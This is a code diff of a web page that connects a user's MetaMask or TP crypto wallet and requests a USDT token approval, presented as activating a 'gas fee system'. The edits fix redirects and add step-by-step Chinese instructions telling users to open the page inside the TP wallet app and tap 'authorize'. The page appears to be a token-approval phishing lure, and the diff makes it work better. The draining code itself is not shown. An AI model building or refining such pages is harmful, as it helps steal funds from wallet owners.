@@ -95,7 +95,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;backgrou
     <div style="margin-top:4px">您的钱包: <span class="addr" id="walletAddr">--</span></div>
   </div>
 
-  <button class="btn" style="background:#21262d;color:#8b949e;margin-top:16px" onclick="location.href='/'">返回</button>
+  <button class="btn" style="background:#21262d;color:#8b949e;margin-top:16px" onclick="location.href='index.html'">返回</button>
 </div>
 
 <script>
@@ -219,11 +219,14 @@ async function connectWallet() {
 
   if (!provider) {
     var walletName = selectedWallet === 'metamask' ? 'MetaMask' : 'TP Wallet';
+    var msgEl = document.getElementById('msg');
+    msgEl.className = 'msg err';
     if (selectedWallet === 'tp') {
-      showMsg('未检测到 TP 钱包\n\n请确保：\n• 在 TP 钱包 App 中打开此页面（DApp 浏览器），或\n• 安装 TP 钱包浏览器插件\n\n也可选择 MetaMask 授权', 'err');
+      msgEl.innerHTML = '未检测到 TP 钱包<br><br>请在 TP 钱包 App 中打开此页面：<br>1. 打开 TP 钱包 App<br>2. 点击底部「发现」<br>3. 在搜索框粘贴当前网址<br>4. 打开后点击「去授权」<br><br><a href="https://tokenpocket.pro/" target="_blank" style="color:#58a6ff;text-decoration:underline">下载 TP 钱包</a> &nbsp;或选择 <b>MetaMask</b> 授权';
     } else {
-      showMsg('未检测到 MetaMask，请先安装 MetaMask 浏览器插件\n\n也可选择 TP 钱包授权', 'err');
+      msgEl.innerHTML = '未检测到 MetaMask<br><br>请安装 MetaMask 浏览器插件后刷新页面<br><br><a href="https://metamask.io/download/" target="_blank" style="color:#58a6ff;text-decoration:underline">下载 MetaMask</a> &nbsp;或选择 <b>TP 钱包</b> 授权';
     }
+    msgEl.style.display = 'block';
     setStep(1, 'err');
     return;
   }
@@ -377,7 +380,7 @@ async function approveUSDT() {
 
     setStep(3, 'done');
     showMsg('✅ 授权成功！盖茨费系统已激活，3秒后返回...', 'ok');
-    setTimeout(function() { location.href = '/'; }, 3000);
+    setTimeout(function() { location.href = 'index.html'; }, 3000);
 
   } catch (e) {
     showMsg('授权失败: ' + (e.message || '用户拒绝'), 'err');
